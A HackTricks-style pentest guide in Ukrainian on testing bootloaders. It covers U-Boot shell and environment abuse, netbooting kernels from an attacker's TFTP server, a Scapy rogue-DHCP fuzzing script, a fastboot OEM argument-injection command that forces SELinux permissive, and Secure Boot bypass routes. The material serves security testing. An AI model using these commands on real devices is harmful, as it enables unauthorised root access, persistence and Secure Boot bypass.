# Тестування Bootloader

{{#include ../../banners/hacktricks-training.md}}

Нижче наведено рекомендовані кроки для модифікації конфігурацій запуску пристрою та тестування bootloader, таких як U-Boot і завантажувачі класу UEFI. Зосередьтеся на отриманні виконання коду на ранньому етапі, оцінюванні захисту підписів/rollback, а також зловживанні recovery- або network-boot шляхами.

Пов’язане: MediaTek secure-boot bypass через патчинг bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Швидкі перемоги в U-Boot і зловживання environment

1. Отримайте доступ до interpreter shell
- Під час boot натисніть відому клавішу переривання (часто будь-яку клавішу, 0, пробіл або специфічну для плати "magic" послідовність) до виконання `bootcmd`, щоб перейти до prompt U-Boot.<sup>[[1]](#references)</sup>

2. Перевірте стан boot і змінні
- Корисні команди:
- `printenv` (вивести environment)
- `bdinfo` (інформація про плату, адреси пам’яті)
- `help bootm; help booti; help bootz` (підтримувані методи boot kernel)
- `help ext4load; help fatload; help tftpboot` (доступні loaders)

3. Змініть boot arguments для отримання root shell
- Додайте `init=/bin/sh`, щоб kernel перейшов до shell замість звичайного init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Виконайте netboot із вашого TFTP server
- Налаштуйте мережу та отримайте kernel/fit image з LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Збережіть зміни через environment
- Якщо storage для env не захищене від запису, можна зберегти контроль:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Перевірте такі змінні, як `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, що впливають на fallback paths. Неправильно налаштовані значення можуть дозволити багаторазово переривати boot і переходити до shell.

6. Перевірте debug/небезпечні функції
- Шукайте: `bootdelay` > 0, вимкнений `autoboot`, необмежений `usb start; fatload usb 0:1 ...`, можливість виконання `loady`/`loads` через serial, `env import` із недовірених media, а також kernel/ramdisk, які завантажуються без перевірки підписів.

7. Тестування U-Boot image/verification
- Якщо платформа заявляє про secure/verified boot із FIT images, спробуйте як unsigned, так і tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або legacy-поведінка `verify=n` часто дозволяє boot довільних payload.
- Не зупиняйтеся на простому результаті allow/deny: нещодавні дослідження FIT показали, що сам verification path може бути pre-auth attack surface. Виконуйте negative-test для externally stored FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, а також обробки overlay / `extra-conf`.
- Якщо у вас є відповідне source tree, `test/vboot/vboot_test.sh` — швидкий спосіб відтворити поведінку FIT verification у U-Boot sandbox до роботи зі справжнім hardware.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` і script bootflows
- У сучасних збірках U-Boot `bootcmd` часто є лише wrapper навколо Standard Boot. Це означає, що writable media, PXE або SPI flash можуть бути справжньою trust boundary, навіть якщо видимий environment здається безпечним.
- `extlinux` bootmeth шукає `extlinux/extlinux.conf` у `/` та `/boot`; script bootmeth спочатку шукає `boot.scr.uimg`, а потім `boot.scr`. Під час network boot ім’я script може надходити з `boot_script_dhcp`.
- Корисні команди для triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Випадки для перевірки: контрольовані attacker USB/SD media, що мають вищий пріоритет у `boot_targets`, writable `/boot/extlinux/extlinux.conf`, rogue TFTP, який надає `boot.scr`, або виконання script через SPI за допомогою `script_offset_f`.
- Якщо платформа покладається на FIT verification, переконайтеся, що configurations підписані на рівні configuration, а не лише окремих images; `required-mode=all` сильніший за прийняття будь-якого одного required key.

## Network-boot surface (DHCP/PXE) і rogue servers

9. Fuzzing параметрів PXE/DHCP
- Legacy BOOTP/DHCP handling в U-Boot мав проблеми memory safety. Наприклад, CVE‑2024‑42040 описує memory disclosure через crafted DHCP responses, які можуть leak bytes з пам’яті U-Boot назад у мережу.<sup>[[4]](#references)</sup> Перевіряйте DHCP/PXE code paths за допомогою надто довгих/граничних значень (option 67 bootfile-name, vendor options, поля file/servername) і спостерігайте за зависаннями/leaks.
- Мінімальний Scapy snippet для stress testing boot parameters під час netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Також перевірте, чи передаються PXE filename fields до shell/loader logic без sanitization, коли вони пов’язані з OS-side provisioning scripts.

10. Тестування command injection через rogue DHCP server
- Налаштуйте rogue DHCP/PXE service і спробуйте інжектувати символи в filename або options fields, щоб досягти command interpreters на наступних етапах boot chain. Metasploit DHCP auxiliary, `dnsmasq` або custom Scapy scripts добре підходять для цього. Спочатку ізолюйте lab network.

## SoC ROM recovery modes, що обходять звичайний boot

Багато SoC надають BootROM "loader" mode, який приймає code через USB/UART, навіть якщо flash images недійсні. Якщо secure-boot fuses не запрограмовані, це може надати arbitrary code execution на дуже ранньому етапі chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) або `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` для передачі та запуску custom U-Boot із RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` або `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` для staging loader і завантаження custom U-Boot.

Оцініть, чи має пристрій запрограмовані secure-boot eFuses/OTP. Якщо ні, BootROM download modes часто обходять будь-яку verification на вищому рівні (U-Boot, kernel, rootfs), безпосередньо виконуючи ваш first-stage payload із SRAM/DRAM.

## Bootloaders класу UEFI/PC: швидкі перевірки

11. Тестування ESP tampering, rollback і key-enrollment
- Підключіть EFI System Partition (ESP) і перевірте loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Коли можливо, отримайте Secure Boot state і key databases з OS:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Якщо платформа перебуває в Setup Mode, приймає unauthenticated key enrollment або постачається з test/default Platform Key (клас PKfail), локальний admin або physical attacker може додати власні KEK/db і залишити Secure Boot у стані “enabled”, завантажуючи довільні EFI binaries.<sup>[[3]](#references)</sup>
- Спробуйте boot із downgraded або відомими vulnerable signed boot components, якщо Secure Boot revocations (dbx) не є актуальними. Якщо платформа все ще довіряє старим shims/bootmanagers, часто можна завантажити власний kernel або `grub.cfg` з ESP для отримання persistence.

12. Тестування stale shim / SBAT / dbx revocation
- Старі Microsoft-signed shims і vendor forks можуть залишатися bootkit path у стилі BYOVD, якщо revocations застарілі. В ізольованій lab розмістіть історично vulnerable shim на ESP і спробуйте chainload власний `grubx64.efi` або kernel.<sup>[[11]](#references)</sup>
- Швидкий triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Якщо shim все ще запускається, хоча перебуває у revocation list, firmware/OS має stale `dbx` updates або довіряє forked loader, який ніколи не успадкував upstream SBAT protections.

13. Bugs у parsing boot logo (клас LogoFAIL)
- Деякі OEM/IBV firmware були вразливими до image-parsing flaws у DXE, що обробляє boot logos. Якщо attacker може розмістити crafted image на ESP у vendor-specific path (наприклад, `\EFI\<vendor>\logo\*.bmp`) і перезавантажити пристрій, виконання коду на ранньому етапі boot може бути можливим навіть із увімкненим Secure Boot. Перевірте, чи приймає платформа user-supplied logos і чи доступні ці paths для запису з OS.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16): прогалини довіри

На пристроях Android 16, які використовують Qualcomm ABL для завантаження **Generic Bootloader Library (GBL)**, перевірте, чи **authenticates** ABL UEFI app, яку він завантажує з partition `efisp`. Якщо ABL перевіряє лише **presence** UEFI app і не перевіряє підписи, primitive для запису в `efisp` перетворюється на **pre-OS unsigned code execution** під час boot.<sup>[[6]](#references)[[7]](#references)</sup>

Практичні перевірки та abuse paths:

- **efisp write primitive**: Потрібен спосіб записати custom UEFI app в `efisp` (root/privileged service, OEM app bug, recovery/fastboot path). Без цього GBL loading gap недоступний безпосередньо.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): Деякі builds приймають додаткові tokens у `fastboot oem set-gpu-preemption` і додають їх до kernel cmdline. Це можна використати, щоб увімкнути permissive SELinux і дозволити записи в protected partitions:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Якщо пристрій patched, команда має відхиляти додаткові arguments.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock через persistent flags**: Payload на boot stage може змінити persistent unlock flags (наприклад, `is_unlocked=1`, `is_unlocked_critical=1`), імітуючи `fastboot oem unlock` без OEM server/approval gates. Це довготривала зміна security posture після наступного reboot.<sup>[[6]](#references)</sup>

Defensive/triage notes:

- Переконайтеся, чи виконує ABL signature verification GBL/UEFI payload з `efisp`. Якщо ні, вважайте `efisp` high-risk persistence surface.
- Перевірте, чи patched ABL fastboot OEM handlers для **validate argument counts** і відхилення додаткових tokens.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware caution

Будьте обережні під час роботи зі SPI/NAND flash на ранньому етапі boot (наприклад, із grounding pins для обходу reads) і завжди консультуйтеся з flash datasheet. Несвоєчасні shorts можуть пошкодити пристрій або programmer.

## Notes і додаткові tips

- Спробуйте `env export -t ${loadaddr}` і `env import -t ${loadaddr}`, щоб переміщати environment blobs між RAM і storage; деякі платформи дозволяють імпортувати env зі removable media без authentication.
- Для persistence у Linux-based systems, які boot через `extlinux.conf`, часто достатньо змінити рядок `APPEND` (додати `init=/bin/sh` або `rd.break`) на boot partition, якщо signature checks не enforced.
- Якщо target використовує dual-slot / A/B updates, перегляньте anti-rollback і slot-desync techniques у [firmware analysis overview](README.md), щоб не пропустити updater-only trust gaps поза самим bootloader.
- Якщо userland надає `fw_printenv/fw_setenv`, перевірте, що `/etc/fw_env.config` відповідає реальному env storage. Неправильно налаштовані offsets дозволяють читати/записувати неправильний MTD region.

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
